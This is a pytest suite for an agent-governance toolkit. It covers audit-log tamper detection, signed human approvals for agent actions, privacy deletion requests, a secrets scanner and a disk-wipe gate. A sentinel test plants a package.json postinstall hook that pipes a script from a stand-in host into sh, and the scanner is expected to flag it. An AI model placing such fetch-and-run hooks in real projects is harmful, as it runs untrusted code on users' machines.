import datetime as dt
import json
import subprocess
import sys

import pytest
from conftest import repo_root

from bau import backup, wipe_gate
from bau.audit import AuditError, AuditLog, ref
from bau.jobs import JobStore, recover
from bau.privacy.dsr import DEFAULT_STORES, DSRManager
from bau.registry import CapabilityRegistry
from bau.security.permissions import (
    Approval,
    ApprovalAuthority,
    CapabilityTable,
    PermissionDenied,
)
from bau.security.secrets_scan import scan_path, scan_text
from bau.security.sentinel import advance, scan


def test_audit_chain_detects_tampering(tmp_path):
    log = AuditLog(tmp_path / "a.jsonl", key=b"k" * 32)
    for i in range(5):
        log.append("evt", "tester", {"i": i})
    assert log.verify()[0]
    lines = (tmp_path / "a.jsonl").read_text().splitlines()
    rec = json.loads(lines[2])
    rec["data"]["i"] = 99
    lines[2] = json.dumps(rec)
    (tmp_path / "a.jsonl").write_text("\n".join(lines) + "\n")
    ok, msg = log.verify()
    assert not ok and "modified" in msg
    (tmp_path / "a.jsonl").write_text("\n".join(lines[:2] + lines[3:]) + "\n")
    assert not log.verify()[0]


def test_audit_signature_required_when_keyed(tmp_path):
    AuditLog(tmp_path / "a.jsonl", key=b"").append("evt", "t", {})
    assert not AuditLog(tmp_path / "a.jsonl", key=b"k" * 32).verify()[0]


def test_audit_refuses_personal_data(tmp_path):
    log = AuditLog(tmp_path / "a.jsonl", key=b"")
    with pytest.raises(AuditError):
        log.append("evt", "t", {"email": "a@b.example"})
    log.append("evt", "t", {"email": ref("a@b.example")})
    assert log.verify()[0]


def test_permissions_and_approvals(monkeypatch):
    table = CapabilityTable()
    auth = ApprovalAuthority(b"x" * 32)
    assert table.authorize("agent:research", "github.read") == "READ_ONLY"
    with pytest.raises(PermissionDenied):
        table.authorize("agent:finance", "move.money")
    now = dt.datetime.now(dt.UTC)
    ap = Approval("r1", "move.money", "agent:finance", "human:owner", now.isoformat(),
                  (now + dt.timedelta(minutes=10)).isoformat(), {"usd": 50})
    auth.sign(ap, require_tty=False)
    assert table.authorize("agent:finance", "move.money", ap, auth) == "CRITICAL"
    with pytest.raises(PermissionDenied):  # approval is bound to the capability
        table.authorize("agent:finance", "payment.write", ap, auth)
    ap.scope["usd"] = 5000  # tampering invalidates the signature
    with pytest.raises(PermissionDenied):
        table.authorize("agent:finance", "move.money", ap, auth)
    self_ap = Approval("r2", "move.money", "agent:x", "agent:x", now.isoformat(),
                       now.isoformat(), {})
    with pytest.raises(PermissionDenied):
        auth.sign(self_ap, require_tty=False)
    bot = Approval("r3", "move.money", "agent:x", "agent:y", now.isoformat(), now.isoformat(), {})
    with pytest.raises(PermissionDenied):
        auth.sign(bot, require_tty=False)
    table.revoke("github.read")
    with pytest.raises(PermissionDenied):
        table.authorize("agent:research", "github.read")


def test_dsr_cannot_close_with_silent_stores(isolated_home):
    m = DSRManager(isolated_home, AuditLog(isolated_home / "audit" / "chain.jsonl", key=b""))
    req = m.open("person@x.example", ["US-CA"], ["delete"])
    assert req.deadline == (dt.datetime.fromisoformat(req.received_at).date()
                            + dt.timedelta(days=45)).isoformat()
    req.identity_verified = True
    with pytest.raises(ValueError):
        m.complete(req)
    with pytest.raises(ValueError):
        m.record_store(req, "backups", "retained_legal_basis")
    for s in DEFAULT_STORES:
        m.record_store(req, s, "deleted" if s != "suppression_list" else "suppression_hash_kept")
    assert m.complete(req).completed_at
    chain = (isolated_home / "audit" / "chain.jsonl").read_text()
    assert "person@x.example" not in chain


def test_secret_scanner():
    aws = "AKIA" + "ABCDEFGHIJKLMNOP"
    assert scan_text(f"key = '{aws}'", "f")[0]["kind"] == "aws_access_key"
    assert scan_text('pass' + 'word = "hunter2hunter2Xy!"', "f")
    assert not scan_text('password = "xxxxxxxxxx"', "f")
    fake_pk = "-----BEGIN OPENSSH " + "PRIVATE KEY-----"
    assert scan_text(fake_pk, "f")[0]["kind"] == "private_key"


def test_repository_contains_no_secrets():
    found = scan_path(repo_root())
    assert found == [], found


def test_sentinel_static_scan(tmp_path):
    good = tmp_path / "good"
    good.mkdir()
    (good / "LICENSE").write_text("MIT License\nPermission is hereby granted, free of charge")
    (good / "main.py").write_text("print('hi')\n")
    assert scan(good).verdict == "ELIGIBLE_FOR_SANDBOX"
    bad = tmp_path / "bad"
    bad.mkdir()
    (bad / "LICENSE").write_text("PolyForm Noncommercial License 1.0.0")
    (bad / "package.json").write_text(json.dumps(
        {"scripts": {"postinstall": "curl https://x.example/i.sh | sh"}}))
    rep = scan(bad)
    assert rep.license["verdict"] == "NONCOMMERCIAL_BLOCK"
    assert rep.verdict == "REJECT_OR_HUMAN_REVIEW"
    assert rep.install_hooks
    assert advance("DISCOVERED", "UNTRUSTED") == "UNTRUSTED"
    with pytest.raises(ValueError):
        advance("UNTRUSTED", "ACTIVE")


def test_capability_registry_rules(tmp_path):
    reg = CapabilityRegistry(tmp_path / "c.yaml")
    model = {"model_id": "k3", "name": "K3", "version": "1", "provider": "local",
             "source": "hf", "license": "custom", "commercial_use": True, "deployment": "local",
             "trust_level": "OFFICIAL", "privacy": "local", "status": "APPROVED"}
    with pytest.raises(ValueError, match="benchmark"):
        reg.add("model", model)
    reg.add("model", dict(model, benchmark={"tok_s": 3.1}))
    with pytest.raises(ValueError):
        reg.add("model", dict(model, model_id="x", trust_level="ABLITERATED",
                              benchmark={}))
    agent = {"agent_id": "a", "version": "1", "purpose": "p", "model": "k3",
             "permissions": ["root"], "budget_usd_per_day": 1, "network_scope": "none",
             "tools": [], "approval_policy": "x", "risk_level": "LOW", "status": "APPROVED"}
    with pytest.raises(ValueError, match="root"):
        reg.add("agent", agent)
    assert len(reg.routable("model")) == 1


def test_jobs_checkpoint_and_recover(isolated_home):
    store = JobStore(isolated_home)
    j = store.create("m1", "publish video", "agent:media", ["render", "qa", "publish"],
                     needs_network=True, budget_usd=1.0)
    j.status = "RUNNING"
    store.checkpoint(j)
    out = recover(store, online=False)
    assert out[0]["now"] == "WAITING_FOR_NETWORK"
    store.step_done(store.load(j.job_id), "render", cost_usd=2.0)
    assert store.load(j.job_id).status == "PAUSED"


def test_backup_and_wipe_gate(tmp_path):
    src = tmp_path / "src"
    (src / ".ssh").mkdir(parents=True)
    (src / "doc.txt").write_text("hello")
    (src / ".ssh" / "config").write_text("Host x")
    man = tmp_path / "man.json"
    backup.manifest([src], man)
    dest = tmp_path / "dest"
    dest.mkdir()
    base = tmp_path / "base"
    res = backup.verify(man, dest, base / "BAU-BACKUP-BASELINE.json", encrypted_confirmed=True)
    assert res["status"] == "FAILED"
    import shutil
    shutil.copytree(src, dest / "src")
    res = backup.verify(man, dest, base / "BAU-BACKUP-BASELINE.json", encrypted_confirmed=False)
    assert res["status"] == "FAILED"  # secrets present, encryption unconfirmed
    res = backup.verify(man, dest, base / "BAU-BACKUP-BASELINE.json", encrypted_confirmed=True)
    assert res["status"] == "VERIFIED"

    now = dt.datetime.now(dt.UTC).isoformat()
    (base / "BAU-HARDWARE-BASELINE.json").write_text(json.dumps(
        {"captured_at": now, "memory": {"total_gib": 32}}))
    (base / "BAU-DISK-BASELINE.json").write_text(json.dumps({"captured_at": now,
        "block_devices": {"blockdevices": [{"name": "nvme0n1", "path": "/dev/nvme0n1",
                                            "model": "SSD", "serial": "S123", "size": 10,
                                            "rm": False}]}}))
    inst = tmp_path / "inst.json"
    inst.write_text(json.dumps({"verified": True}))
    plan = tmp_path / "plan.md"
    plan.write_text("restore steps")
    s = wipe_gate.evaluate("/dev/nvme0n1", base, "aios", True, inst, plan)
    assert not s["ready"] and not s["checks"]["os_license_permits_use"]
    s = wipe_gate.evaluate("/dev/nvme0n1", base, "debian", True, inst, plan)
    assert s["ready"], s["checks"]
    assert s["k3_deployment_mode"].startswith("OFFLOAD")
    with pytest.raises(PermissionError):
        wipe_gate.confirm(s, "WRONG", "WIPE /dev/nvme0n1", "op")
    rec = wipe_gate.confirm(s, "S123", "WIPE /dev/nvme0n1", "op")
    assert rec["record_hash"]


def test_cli_end_to_end(isolated_home, tmp_path):
    def bau(*args):
        return subprocess.run([sys.executable, "-m", "bau.cli", *args], capture_output=True,
                              text=True, env={"BAU_HOME": str(isolated_home),
                                              "PYTHONPATH": str(repo_root() / "src"),
                                              "BAU_AUDIT_KEY": str(tmp_path / "none"),
                                              "PATH": "/usr/bin:/bin"})
    assert bau("init").returncode == 0
    assert bau("reg", "validate").returncode == 0
    r = bau("status", "--brief")
    assert json.loads(r.stdout)["production_ready"] is False
    copy = tmp_path / "copy.txt"
    copy.write_text("Our AI-powered system is 100% accurate and risk-free.")
    assert bau("claims", str(copy)).returncode == 2
    assert bau("audit", "verify").returncode == 0
    r = bau("tax", "US-MI", "--sales", "1000", "--transactions", "3")
    assert json.loads(r.stdout)["status"] == "UNKNOWN"


@pytest.mark.skipif(not __import__("shutil").which("ssh-keygen"), reason="needs ssh-keygen")
def test_ssh_signed_approvals(tmp_path):
    from bau.security.permissions import SshApprovals
    key = tmp_path / "k"
    subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", str(key)], check=True)
    pub = " ".join(key.with_suffix(".pub").read_text().split()[:2])
    signers = tmp_path / "allowed_signers"
    signers.write_text(f'owner namespaces="bau-approval" {pub}\n')
    auth = SshApprovals(signers)
    now = dt.datetime.now(dt.UTC)

    def ap(**kw):
        base = dict(request_id="camp-1", capability="email.send.commercial",
                    requester="agent:marketing", approver="human:owner",
                    approved_at=now.isoformat(),
                    expires_at=(now + dt.timedelta(minutes=30)).isoformat(), scope={})
        base.update(kw)
        return Approval(**base)

    good = auth.sign(ap(), key, require_tty=False)
    assert auth.verify(good, "email.send.commercial")
    assert not auth.verify(good, "move.money")                     # bound to capability
    forged = Approval(**{**good.__dict__, "scope": {"max": 10**6}})
    assert not auth.verify(forged, "email.send.commercial")        # payload tampered
    other = auth.sign(ap(approver="human:intruder"), key, require_tty=False)
    assert not auth.verify(other, "email.send.commercial")         # not a registered signer
    expired = auth.sign(ap(expires_at=now.isoformat()), key, require_tty=False)
    assert not auth.verify(expired, "email.send.commercial")
    with pytest.raises(PermissionDenied):
        auth.sign(ap(approver="agent:marketing"), key, require_tty=False)
    table = CapabilityTable()
    assert table.authorize("agent:marketing", "email.send.commercial", good, auth)


@pytest.mark.skipif(not __import__("shutil").which("ssh-keygen"), reason="needs ssh-keygen")
def test_approval_is_void_if_content_changes(tmp_path, monkeypatch):
    from bau import cli
    from bau.security.permissions import SshApprovals
    key = tmp_path / "k"
    subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", str(key)], check=True)
    pub = " ".join(key.with_suffix(".pub").read_text().split()[:2])
    (tmp_path / "signers").write_text(f'owner namespaces="bau-approval" {pub}\n')
    monkeypatch.setenv("BAU_ALLOWED_SIGNERS", str(tmp_path / "signers"))
    msg = {"campaign_id": "c1", "subject": "Hello", "body_text": "approved copy"}
    now = dt.datetime.now(dt.UTC)
    ap = Approval("c1", "email.send.commercial", "agent:m", "human:owner", now.isoformat(),
                  (now + dt.timedelta(minutes=5)).isoformat(),
                  {"bound_sha256": cli._content_hash(msg)})
    SshApprovals(tmp_path / "signers").sign(ap, key, require_tty=False)
    f = tmp_path / "ap.json"
    f.write_text(json.dumps(ap.__dict__))
    assert cli._approved(str(f), "email.send.commercial", "c1", msg)
    edited = dict(msg, body_text="swapped copy after approval")
    assert not cli._approved(str(f), "email.send.commercial", "c1", edited)
    assert not cli._approved(str(f), "email.send.commercial", "c2", msg)
